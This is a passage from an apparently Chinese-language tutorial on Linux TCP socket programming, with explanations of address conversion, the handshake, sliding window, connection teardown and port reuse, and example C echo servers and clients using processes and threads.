in_addr&#123;in_addr_t s_addr;&#125;;struct sockaddr_in6&#123;sa_family_t sin6_family;in_port_t sin6_port; /* Transport layer port # */uint32_t sin6_flowinfo; /* IPv6 flow information */struct in6_addr sin6_addr; /* IPv6 address */uint32_t sin6_scope_id; /* IPv6 scope-id */&#125;;typedef unsigned short uint16_t;typedef unsigned int uint32_t;typedef uint16_t in_port_t;typedef uint32_t in_addr_t;#define __SOCKADDR_COMMON_SIZE (sizeof (unsigned short int) 所有专用 socket 地址（以及 sockaddr_storage）类型的变量在实际使用时都需要转化为通用 socket 地址类型 sockaddr（强制转化即可），因为所有 socket 编程接口使用的地址参数类型都是 sockaddr。 IP地址转换（字符串IP转换成整数、主机网络字节序的转换）通常，人们习惯用可读性好的字符串来表示 IP 地址，比如用点分十进制字符串表示 IPv4 地址，以及用十六进制字符串表示 IPv6 地址。但编程中我们需要先把它们转化为整数（二进制数）方能使用。而记录日志时则相反，我们要把整数表示的 IP 地址转化为可读的字符串。下面 3 个函数可用于用点分十进制字符串表示的 IPv4 地址和用网络字节序整数表示的 IPv4 地址之间的转换： 1234#include &lt;arpa/inet.h&gt;in_addr_t inet_addr(const char *cp);int inet_aton(const char *cp, struct in_addr *inp);char *inet_ntoa(struct in_addr in); 下面这对更新的函数也能完成前面 3 个函数同样的功能，并且它们同时适用 IPv4 地址和 IPv6 地址： 12345678910111213#include &lt;arpa/inet.h&gt;// p:点分十进制的IP字符串，n:表示network，网络字节序的整数int inet_pton(int af, const char *src, void *dst);//af:地址族： AF_INET AF_INET6//src:需要转换的点分十进制的IP字符串//dst:转换后的结果保存在这个里面// 将网络字节序的整数，转换成点分十进制的IP地址字符串const char *inet_ntop(int af, const void *src, char *dst, socklen_t size);//af:地址族： AF_INET AF_INET6//src: 要转换的ip的整数的地址//dst: 转换成IP地址字符串保存的地方//size：第三个参数的大小（数组的大小）//返回值：返回转换后的数据的地址（字符串），和 dst 是一样的 案例 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;arpa/inet.h&gt;int main()&#123; //创建一个IP字符串，点分十进制的IP地址字符串 char buf[] = &quot;192.168.1.4&quot;; unsigned int num = 0; inet_pton(AF_INET, buf, &amp;num); unsigned char* p = (unsigned char*)&amp;num; printf(&quot;%d %d %d %d\\n&quot;, *p, *(p + 1), *(p + 2), *(p + 3)); //将网络字节序的IP整数转换成点分十进制的IP字符串 char ip[16] = &quot;&quot;; const char* str = inet_ntop(AF_INET, &amp;num, ip, 16); printf(&quot;%s\\n&quot;, str); printf(&quot;%d\\n&quot;, ip == str);&#125; 编译运行结果如下： TCP通信流程 UDP TCP 是否创建连接 无连接 面向连接 是否可靠 不可靠 可靠 连接的对象个数 一对一、一对多、多对一、多对多 支持一对一 传输的方式 面向数据报 面向字节流 首部开销 8个字节 最少20个字节 适用场景 实时应用（视频会议，直播） 可靠性高的应用（文件传输） TCP通信的流程服务器端 创建一个用于监听的套接字 监听：监听有客户端的连接 套接字：这个套接字其实就是一个文件描述符 将这个监听文件描述符和本地的IP和端口绑定（IP和端口就是服务器的地址信息） 客户端连接服务器的时候使用的就是这个IP和端口 设置监听，监听的fd开始工作 阻塞等待，当有客户端发起连接，解除阻塞，接受客户端的连接，会得到一个和客户端通信的套接字（fd） 通信 接收数据 发送数据 通信结束，断开连接 客户端 创建一个用于通信的套接字（fd） 连接服务器，需要指定连接的服务器的 IP 和 端口 连接成功了，客户端可以直接和服务器通信 接收数据 发送数据 通信结束，断开连接 套接字函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt; // 包含了这个头文件，上面两个就可以省略int socket(int domain, int type, int protocol);- 功能：创建一个套接字- 参数：- domain: 协议族AF_INET : ipv4AF_INET6 : ipv6AF_UNIX, AF_LOCAL : 本地套接字通信（进程间通信）- type: 通信过程中使用的协议类型SOCK_STREAM : 流式协议SOCK_DGRAM : 报式协议- protocol : 具体的一个协议。一般写0- SOCK_STREAM : 流式协议默认使用 TCP- SOCK_DGRAM : 报式协议默认使用 UDP- 返回值：- 成功：返回文件描述符，操作的就是内核缓冲区。- 失败：-1int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); // socket命名- 功能：绑定，将fd 和本地的IP + 端口进行绑定- 参数：- sockfd : 通过socket函数得到的文件描述符- addr : 需要绑定的socket地址，这个地址封装了ip和端口号的信息- addrlen : 第二个参数结构体占的内存大小int listen(int sockfd, int backlog); // /proc/sys/net/core/somaxconn- 功能：监听这个socket上的连接- 参数：- sockfd : 通过socket()函数得到的文件描述符- backlog : 未连接的和已经连接的和的最大值， 5int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);- 功能：接收客户端连接，默认是一个阻塞的函数，阻塞等待客户端连接- 参数：- sockfd : 用于监听的文件描述符- addr : 传出参数，记录了连接成功后客户端的地址信息（ip，port）- addrlen : 指定第二个参数的对应的内存大小- 返回值：- 成功 ：用于通信的文件描述符- -1 ： 失败int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);- 功能： 客户端连接服务器- 参数：- sockfd : 用于通信的文件描述符- addr : 客户端要连接的服务器的地址信息- addrlen : 第二个参数的内存大小- 返回值：成功 0， 失败 -1ssize_t write(int fd, const void *buf, size_t count); // 写数据ssize_t read(int fd, void *buf, size_t count); // 读数据 TCP通信实现服务端实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// TCP 通信的服务器端#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123; // 1.创建socket(用于监听的套接字) int lfd = socket(AF_INET, SOCK_STREAM, 0); if (lfd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 2.绑定 struct sockaddr_in saddr; saddr.sin_family = AF_INET; // inet_pton(AF_INET, &quot;192.168.194.129&quot;, saddr.sin_addr.s_addr); saddr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0 saddr.sin_port = htons(9999); int ret = bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); if (ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; // 3.监听 ret = listen(lfd, 8); if (ret == -1) &#123; perror(&quot;listen&quot;); exit(-1); &#125; // 4.接收客户端连接 struct sockaddr_in clientaddr; int len = sizeof(clientaddr); int cfd = accept(lfd, (struct sockaddr*)&amp;clientaddr, &amp;len); if (cfd == -1) &#123; perror(&quot;accept&quot;); exit(-1); &#125; // 输出客户端的信息 char clientIP[16]; inet_ntop(AF_INET, &amp;clientaddr.sin_addr.s_addr, clientIP, sizeof(clientIP)); unsigned short clientPort = ntohs(clientaddr.sin_port); printf(&quot;client ip is %s, port is %d\\n&quot;, clientIP, clientPort); // 5.通信 char recvBuf[1024] = &#123; 0 &#125;; while (1) &#123; // 获取客户端的数据 int num = read(cfd, recvBuf, sizeof(recvBuf)); if (num == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (num &gt; 0) &#123; printf(&quot;recv client data : %s\\n&quot;, recvBuf); &#125; else if (num == 0) &#123; // 表示客户端断开连接 printf(&quot;clinet closed...&quot;); break; &#125; char* data = &quot;hello,i am server&quot;; // 给客户端发送数据 write(cfd, data, strlen(data)); &#125; // 关闭文件描述符 close(cfd); close(lfd); return 0;&#125; 客户端实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// TCP通信的客户端#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123; // 1.创建套接字 int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 2.连接服务器端 struct sockaddr_in serveraddr; serveraddr.sin_family = AF_INET; inet_pton(AF_INET, &quot;192.168.194.129&quot;, &amp;serveraddr.sin_addr.s_addr); serveraddr.sin_port = htons(9999); int ret = connect(fd, (struct sockaddr*)&amp;serveraddr, sizeof(serveraddr)); if (ret == -1) &#123; perror(&quot;connect&quot;); exit(-1); &#125; // 3. 通信 char recvBuf[1024] = &#123; 0 &#125;; while (1) &#123; char* data = &quot;hello,i am client&quot;; // 给客户端发送数据 write(fd, data, strlen(data)); sleep(1); int len = read(fd, recvBuf, sizeof(recvBuf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len &gt; 0) &#123; printf(&quot;recv server data : %s\\n&quot;, recvBuf); &#125; else if (len == 0) &#123; // 表示服务器端断开连接 printf(&quot;server closed...&quot;); break; &#125; &#125; // 关闭连接 close(fd); return 0;&#125; 编译运行如下 TCP三次握手TCP 是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如 IP 地址、端口号等。TCP 可以看成是一种字节流，它会处理 IP 层或以下的层的丢包、重复以及错误问题。在连接的建立过程中，双方需要交换一些连接的参数。这些参数可以放在 TCP 头部。TCP 提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接。采用 四次挥手来关闭一个连接。 三次握手的目的是保证双方互相之间建立了连接 三次握手发生在客户端连接的时候，当调用connect()，底层会通过TCP协议进行三次握手。 16 位端口号（port number）：告知主机报文段是来自哪里（源端口）以及传给哪个上层协议或应用程序（目的端口）的。进行 TCP 通信时，客户端通常使用系统自动选择的临时端口号。 32 位序号（sequence number）：一次 TCP 通信（从 TCP 连接建立到断开）过程中某一个传输方向上的字节流的每个字节的编号。假设主机 A 和主机 B 进行 TCP 通信，A 发送给 B 的第一个TCP 报文段中，序号值被系统初始化为某个随机值 ISN（Initial Sequence Number，初始序号值）。那么在该传输方向上（从 A 到 B），后续的 TCP 报文段中序号值将被系统设置成 ISN 加上该报文段所携带数据的第一个字节在整个字节流中的偏移。例如，某个 TCP 报文段传送的数据是字节流中的第 1025 ~ 2048 字节，那么该报文段的序号值就是 ISN + 1025。另外一个传输方向（从B 到 A）的 TCP 报文段的序号值也具有相同的含义。 32 位确认号（acknowledgement number）：用作对另一方发送来的 TCP 报文段的响应。其值是收到的 TCP 报文段的序号值 + 标志位长度（SYN，FIN） + 数据长度 。假设主机 A 和主机 B 进行TCP 通信，那么 A 发送出的 TCP 报文段不仅携带自己的序号，而且包含对 B 发送来的 TCP 报文段的确认号。反之，B 发送出的 TCP 报文段也同样携带自己的序号和对 A 发送来的报文段的确认序号。 4 位头部长度（head length）：标识该 TCP 头部有多少个 32 bit(4 字节)。因为 4 位最大能表示15，所以 TCP 头部最长是60 字节。 6 位标志位包含如下几项： URG 标志，表示紧急指针（urgent pointer）是否有效。 ACK 标志，表示确认号是否有效。我们称携带 ACK 标志的 TCP 报文段为确认报文段。 PSH 标志，提示接收端应用程序应该立即从 TCP 接收缓冲区中读走数据，为接收后续数据腾出空间（如果应用程序不将接收到的数据读走，它们就会一直停留在 TCP 接收缓冲区中）。 RST 标志，表示要求对方重新建立连接。我们称携带 RST 标志的 TCP 报文段为复位报文段。 SYN 标志，表示请求建立一个连接。我们称携带 SYN 标志的 TCP 报文段为同步报文段。 FIN 标志，表示通知对方本端要关闭连接了。我们称携带 FIN 标志的 TCP 报文段为结束报文段。 16 位窗口大小（window size）：是 TCP 流量控制的一个手段。这里说的窗口，指的是接收通告窗口（Receiver Window，RWND）。它告诉对方本端的 TCP 接收缓冲区还能容纳多少字节的数据，这样对方就可以控制发送数据的速度。 16 位校验和（TCP checksum）：由发送端填充，接收端对 TCP 报文段执行 CRC 算法以校验TCP 报文段在传输过程中是否损坏。注意，这个校验不仅包括 TCP 头部，也包括数据部分。这也是 TCP 可靠传输的一个重要保障。 16 位紧急指针（urgent pointer）：是一个正的偏移量。它和序号字段的值相加表示最后一个紧急数据的下一个字节的序号。因此，确切地说，这个字段是紧急指针相对当前序号的偏移，不妨称之为紧急偏移。TCP 的紧急指针是发送端向接收端发送紧急数据的方法。 第一次握手： 客户端将SYN标志位置为1 生成一个随机的32位的序号，这个序号后边是可以携带数据（数据的大小 第二次握手： 服务器端接受客户端的连接：ACK &#x3D; 1 服务器端会回发一个确认序号：ack &#x3D; 客户端的序号+数据端的长度+FIN&#x2F;SYN（按一个字节算） 服务器端会像向客户端发起连接请求： SYN &#x3D; 1 服务器会生成一个随机序号： seq &#x3D; K 第三次握手： 客户端应答服务器的连接请求： ACK &#x3D; 1 客户端回复收到了服务器端的数据： ack &#x3D; 服务端的序号 + 数据长度 + SYN&#x2F;FIN（按一个字节算） TCP滑动窗口滑动窗口（Sliding window）是一种流量控制技术。早期的网络通信中，通信双方不会考虑网络的拥挤情况直接发送数据。由于大家不知道网络拥塞状况，同时发送数据，导致中间节点阻塞掉包，谁也发不了数据，所以就有了滑动窗口机制来解决此问题。滑动窗口协议是用来改善吞吐量的一种技术，即容许发送方在接收任何应答之前传送附加的包。接收方告诉发送方在某一时刻能送多少包（称窗口尺寸）。TCP 中采用滑动窗口来进行传输控制，滑动窗口的大小意味着接收方还有多大的缓冲区可以用于接收数据。发送方可以通过滑动窗口的大小来确定应该发送多少字节的数据。当滑动窗口为 0时，发送方一般不能再发送数据报。 滑动窗口是 TCP 中实现诸如 ACK 确认、流量控制、拥塞控制的承载结构。 TCP（传输控制协议）滑动窗口机制是一种流量控制和拥塞控制策略，用于保证数据包在不可靠的网络环境中可靠地传输。滑动窗口机制允许发送方在没有收到接收方确认（ACK）的情况下连续发送多个数据包。同时，接收方可以通过调整窗口大小来控制发送方的发送速率。 滑动窗口的主要组成部分包括： **发送窗口 (Send Window)**：发送方维护的一个缓冲区，用于存储尚未被确认的数据包。发送窗口的大小决定了发送方在等待确认之前可以发送多少数据包。 **接收窗口 (Receive Window)**：接收方维护的一个缓冲区，用于存储尚未被处理的数据包。接收窗口的大小决定了接收方可以一次接收多少数据包。 滑动窗口机制的工作流程如下： 发送方将数据划分为一个个数据包，将这些数据包依次存储在发送窗口中。 发送方将发送窗口中的数据包发送给接收方。发送窗口的大小决定了在等待确认之前可以发送多少数据包。 接收方收到数据包后，将数据包存储在接收窗口中，并向发送方发送确认（ACK）。 发送方收到接收方的确认后，将确认过的数据包从发送窗口中移除，并向前滑动窗口，以便继续发送更多数据包。 如果发送方在指定的超时时间内没有收到确认，将会重新发送未被确认的数据包。 接收方可以通过调整接收窗口的大小来控制发送方的发送速率。例如，当接收方的处理速度较慢时，接收方可以减小接收窗口的大小，从而降低发送方的发送速率。 滑动窗口机制的优点： 可以实现流量控制，防止接收方被发送方的数据包淹没。 可以提高网络传输的效率，因为发送方可以在不等待确认的情况下连续发送多个数据包。 可以实现拥塞控制，当网络出现拥塞时，发送方可以减小发送窗口的大小，降低发送速率。 TCP四次挥手四次挥手，在程序中调用了close()会使用TCP协议进行四次挥手 客户端和服务端都可以主动发起断开连接，谁先调用close()谁就是先发起。 因为在TCP连接的时候，采用三次握手的建立是双向的，在断开的时候也需要双向断开。 TCP四次挥手是指在TCP连接断开过程中，两个通信节点之间进行四次报文交互的过程。 四次挥手的过程如下： 第一次挥手（FIN_WAIT_1）：当主动关闭连接的一方（通常称为客户端）认为不再需要发送数据时，它会设置FIN标志并将此报文发送给另一方（通常称为服务器端）。这表示客户端已经完成了数据传输。 第二次挥手（CLOSE_WAIT）：当服务器端收到带有FIN标志的报文时，它会发送一个确认报文（ACK）给客户端。确认报文的ACK序号等于接收到的FIN报文序号加1。此时，服务器端进入CLOSE_WAIT状态，表示它已经知道客户端不再发送数据。 注意，此时TCP连接仍然是半开放的，因为服务器端仍然可以向客户端发送数据。 第三次挥手（FIN_WAIT_2）：当客户端收到服务器端的确认报文后，它会进入FIN_WAIT_2状态。此时，客户端已经关闭了发送通道，但是仍然可以接收服务器端的数据。 第四次挥手（TIME_WAIT）：当服务器端完成数据发送后，它也会设置FIN标志并发送给客户端。当客户端收到带有FIN标志的报文时，它会发送一个确认报文（ACK）给服务器端。确认报文的ACK序号等于接收到的FIN报文序号加1。此时，客户端进入TIME_WAIT状态，并等待一段时间（通常为2倍的最大报文生命周期）以确保服务器端收到确认报文。在等待期间，如果客户端收到服务器端的FIN重传，它会重新发送确认报文。 当服务器端收到客户端的确认报文后，它会立即关闭连接。当客户端等待时间结束后，它也会关闭连接。 总之，TCP四次挥手过程是一个有序的连接关闭过程。这个过程可以确保双方都完成了数据传输，避免了数据丢失和连接半开放的问题。 TCP通信并发要实现TCP通信服务器处理并发的任务，使用多线程或多线程来解决 思路： 一个父进程，多个子进程 父进程负责等待并接受客户端的连接 子进程：完成通信，接受一个客户端连接，就创建一个子进程用于通信 多进程实现服务端实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;signal.h&gt;#include &lt;wait.h&gt;#include &lt;errno.h&gt;void recyleChild(int arg) &#123; while (1) &#123; int ret = waitpid(-1, NULL, WNOHANG); if (ret == -1) &#123; // 所有的子进程都回收了 break; &#125; else if (ret == 0) &#123; // 还有子进程活着 break; &#125; else if (ret &gt; 0) &#123; // 被回收了 printf(&quot;子进程 %d 被回收了\\n&quot;, ret); &#125; &#125;&#125;int main() &#123; struct sigaction act; act.sa_flags = 0; sigemptyset(&amp;act.sa_mask); act.sa_handler = recyleChild; // 注册信号捕捉 sigaction(SIGCHLD, &amp;act, NULL); // 创建socket int lfd = socket(PF_INET, SOCK_STREAM, 0); if (lfd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_port = htons(9999); saddr.sin_addr.s_addr = INADDR_ANY; // 绑定 int ret = bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); if (ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; // 监听 ret = listen(lfd, 128); if (ret == -1) &#123; perror(&quot;listen&quot;); exit(-1); &#125; // 不断循环等待客户端连接 while (1) &#123; struct sockaddr_in cliaddr; int len = sizeof(cliaddr); // 接受连接 int cfd = accept(lfd, (struct sockaddr*)&amp;cliaddr, &amp;len); if (cfd == -1) &#123; if (errno == EINTR) &#123; continue; &#125; perror(&quot;accept&quot;); exit(-1); &#125; // 每一个连接进来，创建一个子进程跟客户端通信 pid_t pid = fork(); if (pid == 0) &#123; // 子进程 // 获取客户端的信息 char cliIp[16]; inet_ntop(AF_INET, &amp;cliaddr.sin_addr.s_addr, cliIp, sizeof(cliIp)); unsigned short cliPort = ntohs(cliaddr.sin_port); printf(&quot;client ip is : %s, prot is %d\\n&quot;, cliIp, cliPort); // 接收客户端发来的数据 char recvBuf[1024]; while (1) &#123; int len = read(cfd, &amp;recvBuf, sizeof(recvBuf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len &gt; 0) &#123; printf(&quot;recv client : %s\\n&quot;, recvBuf); &#125; else if (len == 0) &#123; printf(&quot;client closed....\\n&quot;); break; &#125; write(cfd, recvBuf, strlen(recvBuf) + 1); &#125; close(cfd); exit(0); // 退出当前子进程 &#125; &#125; close(lfd); return 0;&#125; 客户端实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// TCP通信的客户端#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123; // 1.创建套接字 int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 2.连接服务器端 struct sockaddr_in serveraddr; serveraddr.sin_family = AF_INET; inet_pton(AF_INET, &quot;192.168.194.129&quot;, &amp;serveraddr.sin_addr.s_addr); serveraddr.sin_port = htons(9999); int ret = connect(fd, (struct sockaddr*)&amp;serveraddr, sizeof(serveraddr)); if (ret == -1) &#123; perror(&quot;connect&quot;); exit(-1); &#125; // 3. 通信 char recvBuf[1024]; int i = 0; while (1) &#123; sprintf(recvBuf, &quot;data : %d\\n&quot;, i++); // 给服务器端发送数据 write(fd, recvBuf, strlen(recvBuf) + 1); int len = read(fd, recvBuf, sizeof(recvBuf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len &gt; 0) &#123; printf(&quot;recv server : %s\\n&quot;, recvBuf); &#125; else if (len == 0) &#123; // 表示服务器端断开连接 printf(&quot;server closed...&quot;); break; &#125; sleep(1); &#125; // 关闭连接 close(fd); return 0;&#125; 编译运行 多线程实现只有服务端的代码需要修改为多线程的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;pthread.h&gt;struct sockInfo &#123; int fd; // 通信的文件描述符 struct sockaddr_in addr; pthread_t tid; // 线程号&#125;;struct sockInfo sockinfos[128];void* working(void* arg) &#123; // 子线程和客户端通信 cfd 客户端的信息 线程号 // 获取客户端的信息 struct sockInfo* pinfo = (struct sockInfo*)arg; char cliIp[16]; inet_ntop(AF_INET, &amp;pinfo-&gt;addr.sin_addr.s_addr, cliIp, sizeof(cliIp)); unsigned short cliPort = ntohs(pinfo-&gt;addr.sin_port); printf(&quot;client ip is : %s, prot is %d\\n&quot;, cliIp, cliPort); // 接收客户端发来的数据 char recvBuf[1024]; while (1) &#123; int len = read(pinfo-&gt;fd, &amp;recvBuf, sizeof(recvBuf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len &gt; 0) &#123; printf(&quot;recv client : %s\\n&quot;, recvBuf); &#125; else if (len == 0) &#123; printf(&quot;client closed....\\n&quot;); break; &#125; write(pinfo-&gt;fd, recvBuf, strlen(recvBuf) + 1); &#125; close(pinfo-&gt;fd); return NULL;&#125;int main() &#123; // 创建socket int lfd = socket(PF_INET, SOCK_STREAM, 0); if (lfd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_port = htons(9999); saddr.sin_addr.s_addr = INADDR_ANY; // 绑定 int ret = bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); if (ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; // 监听 ret = listen(lfd, 128); if (ret == -1) &#123; perror(&quot;listen&quot;); exit(-1); &#125; // 初始化数据 int max = sizeof(sockinfos) / sizeof(sockinfos[0]); for (int i = 0; i &lt; max; i++) &#123; bzero(&amp;sockinfos[i], sizeof(sockinfos[i])); sockinfos[i].fd = -1; sockinfos[i].tid = -1; &#125; // 循环等待客户端连接，一旦一个客户端连接进来，就创建一个子线程进行通信 while (1) &#123; struct sockaddr_in cliaddr; int len = sizeof(cliaddr); // 接受连接 int cfd = accept(lfd, (struct sockaddr*)&amp;cliaddr, &amp;len); struct sockInfo* pinfo; for (int i = 0; i &lt; max; i++) &#123; // 从这个数组中找到一个可以用的sockInfo元素 if (sockinfos[i].fd == -1) &#123; pinfo = &amp;sockinfos[i]; break; &#125; if (i == max - 1) &#123; sleep(1); i--; &#125; &#125; pinfo-&gt;fd = cfd; memcpy(&amp;pinfo-&gt;addr, &amp;cliaddr, len); // 创建子线程 pthread_create(&amp;pinfo-&gt;tid, NULL, working, pinfo); pthread_detach(pinfo-&gt;tid); &#125; close(lfd); return 0;&#125; 编译运行 TCP状态转换 2MSL（Maximum Segment Lifetime）主动断开连接的一方, 最后进出入一个 TIME_WAIT状态, 这个状态会持续: 2msl msl: 官方建议: 2分钟, 实际是30s当 TCP 连接主动关闭方接收到被动关闭方发送的 FIN 和最终的 ACK 后，连接的主动关闭方必须处于TIME_WAIT 状态并持续 2MSL 时间。这样就能够让 TCP 连接的主动关闭方在它发送的 ACK 丢失的情况下重新发送最终的 ACK。主动关闭方重新发送的最终 ACK 并不是因为被动关闭方重传了 ACK（它们并不消耗序列号，被动关闭方也不会重传），而是因为被动关闭方重传了它的 FIN。事实上，被动关闭方总是重传 FIN 直到它收到一个最终的 ACK。 半关闭 当 TCP 链接中 A 向 B 发送 FIN 请求关闭，另一端 B 回应 ACK 之后（A 端进入 FIN_WAIT_2状态），并没有立即发送 FIN 给 A，A 方处于半连接状态（半开关），此时 A 可以接收 B 发送的数据，但是 A 已经不能再向 B 发送数据。 从程序的角度，可以使用API来控制实现半连接状态： 12345678#include &lt;sys/socket.h&gt;int shutdown(int sockfd, int how);//sockfd: 需要关闭的socket的描述符//how: 允许为shutdown操作选择以下几种方式://SHUT_RD(0)： 关闭sockfd上的读功能，此选项将不允许sockfd进行读操作。//该套接字不再接收数据，任何当前在套接字接受缓冲区的数据将被无声的丢弃掉。//SHUT_WR(1): 关闭sockfd的写功能，此选项将不允许sockfd进行写操作。进程不能在对此套接字发出写操作。//SHUT_RDWR(2):关闭sockfd的读写功能。相当于调用shutdown两次：首先是以SHUT_RD,然后以SHUT_WR。 使用 close 中止一个连接，但它只是减少描述符的引用计数，并不直接关闭连接，只有当描述符的引用计数为 0 时才关闭连接。shutdown 不考虑描述符的引用计数，直接关闭描述符。也可选择中止一个方向的连接，只中止读或只中止写。注意: 如果有多个进程共享一个套接字，close 每被调用一次，计数减 1 ，直到计数为 0 时，也就是所用进程都调用了 close，套接字将被释放。 在多进程中如果一个进程调用了 shutdown(sfd, SHUT_RDWR) 后，其它的进程将无法进行通信。但如果一个进程 close(sfd) 将不会影响到其它进程。 端口复用查看网络相关信息的命令 1netstat 参数： -a 所有的socket -p显示正在使用socket的程序的名称 -n直接使用IP地址，而不通过域名服务器 案例 服务端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123; // 创建socket int lfd = socket(PF_INET, SOCK_STREAM, 0); if (lfd == -1) &#123; perror(&quot;socket&quot;); return -1; &#125; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons(9999); //端口复用 //int optval = 1; //setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &amp;optval, sizeof(optval)); int optval = 1; setsockopt(lfd, SOL_SOCKET, SO_REUSEPORT, &amp;optval, sizeof(optval)); // 绑定 int ret = bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); if (ret == -1) &#123; perror(&quot;bind&quot;); return -1; &#125; // 监听 ret = listen(lfd, 8); if (ret == -1) &#123; perror(&quot;listen&quot;); return -1; &#125; // 接收客户端连接 struct sockaddr_in cliaddr; socklen_t len = sizeof(cliaddr); int cfd = accept(lfd, (struct sockaddr*)&amp;cliaddr, &amp;len); if (cfd == -1) &#123; perror(&quot;accpet&quot;); return -1; &#125; // 获取客户端信息 char cliIp[16]; inet_ntop(AF_INET, &amp;cliaddr.sin_addr.s_addr, cliIp, sizeof(cliIp)); unsigned short cliPort = ntohs(cliaddr.sin_port); // 输出客户端的信息 printf(&quot;client&#x27;s ip is %s, and port is %d\\n&quot;, cliIp, cliPort); // 接收客户端发来的数据 char recvBuf[1024] = &#123; 0 &#125;; while (1) &#123; int len = recv(cfd, recvBuf, sizeof(recvBuf), 0); if (len == -1) &#123; perror(&quot;recv&quot;); return -1; &#125; else if (len == 0) &#123; printf(&quot;客户端已经断开连接...\\n&quot;); break; &#125; else if (len &gt; 0) &#123; printf(&quot;read buf = %s\\n&quot;, recvBuf); &#125; // 小写转大写 for (int i = 0; i &lt; len; ++i) &#123; recvBuf[i] = toupper(recvBuf[i]); &#125; printf(&quot;after buf = %s\\n&quot;, recvBuf); // 大写字符串发给客户端 ret = send(cfd, recvBuf, strlen(recvBuf) + 1, 0); if (ret == -1) &#123; perror(&quot;send&quot;); return -1; &#125; &#125; close(cfd); close(lfd); return 0;&#125; 客户端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int main() &#123; // 创建socket int fd = socket(PF_INET, SOCK_STREAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); return -1; &#125; struct sockaddr_in seraddr; inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;seraddr.sin_addr.s_addr); seraddr.sin_family = AF_INET; seraddr.sin_port = htons(9999); // 连接服务器 int ret = connect(fd, (struct sockaddr*)&amp;seraddr, sizeof(seraddr)); if (ret == -1) &#123; perror(&quot;connect&quot;); return -1; &#125; while (1) &#123; char sendBuf[1024] = &#123; 0 &#125;; fgets(sendBuf, sizeof(sendBuf), stdin); write(fd, sendBuf, strlen(sendBuf) + 1); // 接收 int len = read(fd, sendBuf, sizeof(sendBuf)); if (len == -1) &#123; perror(&quot;read&quot;); return -1; &#125; else if (len &gt; 0) &#123; printf(&quot;read buf = %s\\n&quot;, sendBuf); &#125; else &#123; printf(&quot;服务器已经断开连接...\\n&quot;); break; &#125; &#125; close(fd); return 0;&#125; 首先运行server，然后运行命令 1netstat -anp | grep 9999 然后运行client，再次运行netstat命令 之后断开server，再次运行netstat命令 过一段时间之后再次运行netstat命令 如果我们结束server之后立即断开client，再次运行netstat命令 我们在断开server之后的一分钟之内不能再次启动server，因为端口已经被占用了 